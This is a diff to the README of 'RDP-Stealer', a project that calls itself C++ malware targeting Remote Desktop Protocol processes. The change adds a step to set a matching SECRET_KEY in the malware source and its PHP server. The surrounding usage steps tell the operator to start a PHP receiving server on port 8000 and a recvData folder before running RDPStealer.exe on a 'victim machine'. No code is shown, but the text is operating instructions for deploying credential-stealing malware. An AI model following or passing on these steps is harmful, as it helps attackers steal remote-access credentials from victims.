@@ -16,7 +16,8 @@ RDP-Stealer is C++ malware that targets Remote Desktop Protocol (RDP) processes.
 ## Usage
 
 1. Create a recvData folder in the directory.
-2. Before running the `RDPStealer.exe` on the victim machine, first run the `server.php`.
+2. Change `SECRET_KEY` from `RDPStealer.cpp` and `server.php`.
+3. Before running the `RDPStealer.exe` on the victim machine, first run the `server.php`.
 ```php
 php -S 0.0.0.0:8000
 ```
